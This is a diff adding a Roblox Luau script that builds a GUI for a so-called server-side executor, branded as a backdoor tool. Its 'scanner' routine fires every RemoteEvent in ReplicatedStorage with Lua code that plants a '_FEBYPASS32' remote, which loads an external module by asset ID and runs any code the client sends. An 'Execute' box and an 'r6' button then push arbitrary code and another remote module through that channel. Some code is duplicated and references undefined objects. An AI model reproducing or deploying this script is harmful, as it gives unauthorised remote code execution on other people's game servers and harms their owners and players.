@@ -1,0 +1,469 @@
+
+
+
+
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+-- GUI chính
+local gui = Instance.new("ScreenGui", playerGui)
+gui.Name = "LuauGUI"
+gui.ResetOnSpawn = false
+
+-- Phần pulse frame giữa màn hình
+local frame = Instance.new("Frame", gui)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.Size = UDim2.new(0, 0, 0, 0)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BorderSizePixel = 0
+frame.ZIndex = 0
+frame.ClipsDescendants = true
+frame.Visible = true
+
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)
+
+task.wait(1)
+local grow = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+	Size = UDim2.new(0, 300, 0, 100)
+})
+local shrink = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+	Size = UDim2.new(0, 0, 0, 0)
+})
+
+grow:Play()
+grow.Completed:Connect(function()
+	task.wait(3)
+	shrink:Play()
+	shrink.Completed:Connect(function()
+		frame:Destroy()
+	end)
+end)
+
+-- Hiệu ứng chữ trượt ra từng ký tự
+local message = "luau x backdoored/by gojohdkaisenkt"
+local center = UDim2.new(0.5, 0, 0.5, 0)
+local spacing = 8
+
+for i = 1, #message do
+	local char = message:sub(i, i)
+	if char ~= " " then
+		local label = Instance.new("TextLabel", gui)
+		label.Text = char
+		label.Font = Enum.Font.GothamBold
+		label.TextColor3 = Color3.new(1, 1, 1)
+		label.TextStrokeColor3 = Color3.new(0, 0, 0)
+		label.TextStrokeTransparency = 0.5
+		label.BackgroundTransparency = 1
+		label.TextSize = 16
+		label.Size = UDim2.new(0, 20, 0, 20)
+		label.AnchorPoint = Vector2.new(0.5, 0.5)
+		label.Position = center
+		label.TextTransparency = 1
+
+		local offset = (i - (#message / 2 + 0.5)) * spacing
+		local targetPos = center + UDim2.new(0, offset, 0, 0)
+
+		local appearTween = TweenService:Create(label, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+			Position = targetPos,
+			TextTransparency = 0
+		})
+		appearTween:Play()
+
+		task.delay(1, function()
+			local fade = TweenService:Create(label, TweenInfo.new(0.5), {
+				TextTransparency = 1
+			})
+			fade:Play()
+			game.Debris:AddItem(label, 2)
+		end)
+
+		task.wait(0.06)
+	end
+end
+
+local gui = Instance.new("ScreenGui", playerGui)
+gui.Name = "LuauGUI"
+gui.ResetOnSpawn = false
+
+-- Phần pulse frame giữa màn hình
+local frame = Instance.new("Frame", gui)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.Size = UDim2.new(0, 0, 0, 0)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BorderSizePixel = 0
+frame.ZIndex = 0
+frame.ClipsDescendants = true
+frame.Visible = true
+
+local imageLabel = Instance.new("ImageLabel")
+imageLabel.Name = "imageLabel"
+imageLabel.Size = UDim2.new(0, 200, 0, 150)
+imageLabel.Position = UDim2.new(0.5, 0, 0.4, 0)
+imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+imageLabel.BackgroundTransparency = 1
+imageLabel.Image = "http://www.roblox.com/asset/?id=123145425569096" -- Thay bằng ID ảnh thật
+imageLabel.ImageTransparency = 0 -- Mờ hoàn toàn ban đầu
+imageLabel.Parent = frame
+
+local Name = Instance.new("TextLabel")
+Name.Name = "Name"
+Name.Parent = frame
+Name.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Name.Size = UDim2.new(0, 300, 0, 30)
+Name.BorderColor3 = Color3.new(0, 0, 0)
+Name.Font = Enum.Font.GothamBold
+Name.Position = UDim2.new(0, 0, 0.75, 0)
+Name.Text = "Luau x SS"
+Name.TextColor3 = Color3.fromRGB(255, 255, 255)
+Name.TextScaled = true
+Name.TextWrapped = true
+Name.Visible = true
+
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)
+
+task.wait(3)
+local grow = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+	Size = UDim2.new(0, 300, 0, 200)
+})
+local shrink = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+	Size = UDim2.new(0, 0, 0, 0)
+})
+
+grow:Play()
+grow.Completed:Connect(function()
+	task.wait(3)
+	shrink:Play()
+	shrink.Completed:Connect(function()
+		frame:Destroy()
+	end)
+end)
+
+-- Corner toggle GUI
+local cornerGui = Instance.new("ScreenGui")
+cornerGui.Name = "CornerToggleGui"
+cornerGui.Parent = playerGui
+cornerGui.ResetOnSpawn = true
+
+local toggleButton = Instance.new("TextButton")
+toggleButton.Size = UDim2.new(0, 100, 0, 40)
+toggleButton.Position = UDim2.new(0, 10, 1, -10)
+toggleButton.AnchorPoint = Vector2.new(0, 1)
+toggleButton.Text = "Show"
+toggleButton.Font = Enum.Font.SourceSansBold
+toggleButton.TextScaled = true
+toggleButton.TextColor3 = Color3.new(1, 1, 1)
+toggleButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+toggleButton.Parent = cornerGui
+
+Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 20)
+
+local contentFrame = Instance.new("Frame")
+contentFrame.Size = UDim2.new(0, 560, 0, 279)
+contentFrame.Position = UDim2.new(-10, 0, -10, 0)
+contentFrame.AnchorPoint = Vector2.new(0, 1)
+contentFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+contentFrame.BorderSizePixel = 0
+contentFrame.ZIndex = 0
+contentFrame.Parent = cornerGui
+
+Instance.new("UICorner", contentFrame)
+
+local Name = Instance.new("TextLabel")
+Name.Name = "Name"
+Name.Parent = contentFrame
+Name.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Name.Size = UDim2.new(0, 555, 0, 30)
+Name.BorderColor3 = Color3.new(0, 0, 0)
+Name.Font = Enum.Font.GothamBold
+Name.Text = "Luau X SS"
+Name.TextColor3 = Color3.fromRGB(255, 255, 255)
+Name.TextScaled = true
+Name.TextWrapped = true
+Name.Visible = true
+
+Instance.new("UICorner", Name)
+-- Vòng tròn lớn
+local bigCircle = Instance.new("ImageLabel")
+bigCircle.Name = "BigCircle"
+bigCircle.Size = UDim2.new(0, 90, 0, 90)
+bigCircle.Position = UDim2.new(0, 0, 0, 0)
+bigCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+bigCircle.BackgroundTransparency = 1
+bigCircle.Image = "rbxassetid://115075737237359"
+bigCircle.Parent = contentFrame
+bigCircle.Visible = true
+
+-- Vòng tròn nhỏ quay quanh
+local smallCircle = Instance.new("ImageLabel")
+smallCircle.Name = "SmallCircle"
+smallCircle.Size = UDim2.new(0, 50, 0, 50)
+smallCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+smallCircle.BackgroundTransparency = 1
+smallCircle.Image = "rbxassetid://86158485123944"
+smallCircle.Parent = bigCircle
+
+-- Quay quanh bigCircle
+local radius = 55
+local speed = 2
+local startAngle = math.rad(45)
+
+RunService.RenderStepped:Connect(function()
+	local angle = startAngle + tick() * speed
+	local x = math.cos(angle) * radius
+	local y = math.sin(angle) * radius
+	smallCircle.Position = UDim2.new(0.5, x, 0.5, y)
+end)
+
+-- Nút ?
+local button = Instance.new("TextButton", contentFrame)
+button.Size = UDim2.new(0, 40, 0, 25)
+button.Position = UDim2.new(0.93, 0, 0, 0)
+button.Text = "?"
+button.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+button.TextColor3 = Color3.new(1, 1, 1)
+button.Font = Enum.Font.SourceSansBold
+button.TextScaled = true
+button.Visible = true
+button.AutoButtonColor = false
+
+local unfe = Instance.new("TextButton")
+unfe.Name = "unfe"
+unfe.Parent = contentFrame
+unfe.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
+unfe.BorderColor3 = Color3.fromRGB(0, 0, 0)
+unfe.BorderSizePixel = 0
+unfe.Position = UDim2.new(0, 0, 0.792114913, 0)
+unfe.Size = UDim2.new(0, 80, 0, 43)
+unfe.Font = Enum.Font.SourceSans
+unfe.Text = "Execute"
+unfe.TextColor3 = Color3.fromRGB(0, 0, 0)
+unfe.TextScaled = true
+unfe.TextSize = 14.000
+unfe.Visible = true
+unfe.TextWrapped = true
+
+local Clear = Instance.new("TextButton", contentFrame)
+Clear.Name = "Clear"
+Clear.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- Tạm để dễ thấy
+Clear.Position = UDim2.new(0.16, 0, 0.792114913, 0)
+Clear.Size = UDim2.new(0, 80, 0, 43)
+Clear.Font = Enum.Font.SourceSans
+Clear.Text = "Clear"
+Clear.TextColor3 = Color3.fromRGB(0, 0, 0)
+Clear.TextScaled = true
+Clear.TextWrapped = true
+Clear.ZIndex = 3
+Clear.Active = true
+Clear.Visible = true
+
+local wtf = Instance.new("TextButton", contentFrame)
+wtf.Name = "wth u Success decode moonsec v3?"
+wtf.Parent = contentFrame
+wtf.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
+wtf.BorderColor3 = Color3.fromRGB(0, 0, 0)
+wtf.BorderSizePixel = 0
+wtf.Position = UDim2.new(0.32, 0, 0.792114913, 0)
+wtf.Size = UDim2.new(0, 80, 0, 43)
+wtf.Font = Enum.Font.SourceSans
+wtf.Text = "scanner"
+wtf.TextColor3 = Color3.fromRGB(0, 0, 0)
+wtf.TextScaled = true
+wtf.TextSize = 14.000
+wtf.TextWrapped = true
+wtf.Visible = true
+
+local r6 = Instance.new("TextButton", contentFrame)
+r6.Name = "wth u Success decode moonsec v3?"
+r6.Parent = contentFrame
+r6.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
+r6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+r6.BorderSizePixel = 0
+r6.Position = UDim2.new(0.48, 0, 0.792114913, 0)
+r6.Size = UDim2.new(0, 80, 0, 43)
+r6.Font = Enum.Font.SourceSans
+r6.Text = "r6"
+r6.TextColor3 = Color3.fromRGB(0, 0, 0)
+r6.TextScaled = true
+r6.TextSize = 14.000
+r6.TextWrapped = true
+r6.Visible = true
+
+local best = Instance.new("TextButton", contentFrame)
+best.Name = "wth u Success decode moonsec v3?"
+best.Parent = contentFrame
+best.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
+best.BorderColor3 = Color3.fromRGB(0, 0, 0)
+best.BorderSizePixel = 0
+best.Position = UDim2.new(0.80, 0, 0.792114913, 0)
+best.Size = UDim2.new(0, 80, 0, 43)
+best.Font = Enum.Font.SourceSans
+best.Text = "soon"
+best.TextColor3 = Color3.fromRGB(0, 0, 0)
+best.TextScaled = true
+best.TextSize = 14.000
+best.Visible = true
+best.TextWrapped = true
+
+-- Frame phụ khi hover
+local frame2 = Instance.new("Frame", contentFrame)
+frame2.Size = UDim2.new(0, 150, 0, 100)
+frame2.Position = UDim2.new(0.79, 0, 0, 0)
+frame2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+frame2.Visible = false
+
+local label = Instance.new("TextLabel", frame2)
+label.Size = UDim2.new(1, 0, 1, 0)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.new(1, 1, 1)
+label.Text = "luau x by gojohdkaisenkt v1.0.0 i will upd soon:D"
+label.TextScaled = true
+label.Font = Enum.Font.SourceSans
+
+local Script = Instance.new("TextBox", contentFrame)
+Script.Name = "Script"
+Script.BackgroundColor3 = Color3.new(255, 255, 255)
+Script.BorderColor3 = Color3.new(0, 0, 0)
+Script.Position = UDim2.new(0.0178571437, 0, 0.179211468, 0)
+Script.Size = UDim2.new(0, 540, 0, 156)
+Script.MultiLine = true
+Script.ClearTextOnFocus = false
+Script.Font = Enum.Font.Code
+Script.PlaceholderText = "Require(6666666666).load(\"c00lkidds\")"
+Script.Text = "scanner for use r6 and more"
+Script.TextColor3 = Color3.new(0, 0, 0)
+Script.TextSize = 25
+Script.ZIndex = 0
+Script.TextWrapped = true
+Script.TextXAlignment = Enum.TextXAlignment.Left
+Script.TextYAlignment = Enum.TextYAlignment.Top
+Script.Visible = true
+
+Instance.new("UICorner", Script)
+Instance.new("UICorner", unfe)
+Instance.new("UICorner", Clear)
+Instance.new("UICorner", r6)
+Instance.new("UICorner", wtf)
+Instance.new("UICorner", best)
+Instance.new("UICorner", button)
+Instance.new("UICorner", Script)
+Instance.new("UICorner", label2)
+Instance.new("UICorner", contentFrame2)
+
+-- Toggle Show/Close
+local isVisible = false
+
+toggleButton.MouseButton1Click:Connect(function()
+	if not isVisible then
+		isVisible = true
+		contentFrame.Visible = true
+		contentFrame.Position = UDim2.new(-0.5, 0, 1.5, 0)
+
+		local tweenIn = TweenService:Create(contentFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+			Position = UDim2.new(0.55, 0, 0.5, 0)
+		})
+		tweenIn:Play()
+        contentFrame.AnchorPoint = Vector2.new(0.5, 0.5) -- Neo vào 
+		toggleButton.Text = "Close"
+	else
+		isVisible = false
+
+		local tweenOut = TweenService:Create(contentFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
+			Position = UDim2.new(-0.5, 0, 1.5, 0)
+		})
+		tweenOut:Play()
+
+		tweenOut.Completed:Connect(function()
+			contentFrame.Visible = false
+		end)
+		toggleButton.Text = "Show"
+	end
+end)
+
+-- Hiện frame2 khi giữ nút ?
+local holding = false
+button.MouseButton1Down:Connect(function()
+	holding = true
+	frame2.Visible = true
+end)
+button.MouseLeave:Connect(function()
+	holding = false
+	frame2.Visible = false
+end)
+button.MouseButton1Up:Connect(function()
+	holding = false
+	frame2.Visible = false
+end)
+
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(54, 54, 54))}
+UIGradient.Parent = contentFrame
+
+---scriptex---
+function execute(s)
+	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+		local Execute=game:GetService("JointsService"):FindFirstChild("_FEBYPASS32"):FireServer(tostring(s)) -- execute
+	else
+		warn("Failed to loadstring: Error 404")
+	end
+end
+
+Clear.MouseButton1Click:Connect(function()
+       Script.Text = ""
+end)
+
+wtf.MouseButton1Click:Connect(function()
+
+ local function b_G_V12(see)
+		local a = function(ree)
+			ree:FireServer([[
+                    local folder = Instance.new('RemoteEvent')
+                    folder.Name = "_FEBYPASS32"
+                    folder.Parent = game:GetService("JointsService")
+                    local loadstring = require(13684410229)
+                    folder.OnServerEvent:Connect(function(_1,_2)
+                       loadstring(_2)()
+                    end)
+                    ]]
+			)
+		end
+		for i, v in pairs(see:GetChildren()) do
+			--[[3 lines]]
+			if v:IsA("RemoteEvent") then
+				if not string.match(string.lower(v.Name), "ban") then
+					if not string.match(string.lower(v.Name), "kick") then
+						a(v)
+					end
+				end
+			end
+			--[[-3 lines]]
+			b_G_V12(v) --[[test]]
+		end
+	end
+	local Inject = b_G_V12(game:GetService("ReplicatedStorage"))
+	local timetoken = 0
+	local maxtime = 0.1
+	repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
+	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+
+		wtf.Text = "fd:)"
+execute("local h = Instance.new(\"Hint\") h.Parent = Workspace h.Text = \"luau x faster scanner| by gojohdkaisenkt\" wait(30) h:Remove()")
+ else
+
+ wtf.Text = "scanning..."
+wait (2)
+       wtf.Text = "not fd :("
+	end
+end)
+ 
+r6.MouseButton1Click:Connect(function()
+
+execute('require(3436957371):r6("' .. game.Players.LocalPlayer.Name .. '")')
+  end)
+unfe.MouseButton1Click:Connect(function()
+
+game.ReplicatedStorage.RemoteEvent:FireServer(Script.Text)
+  end)
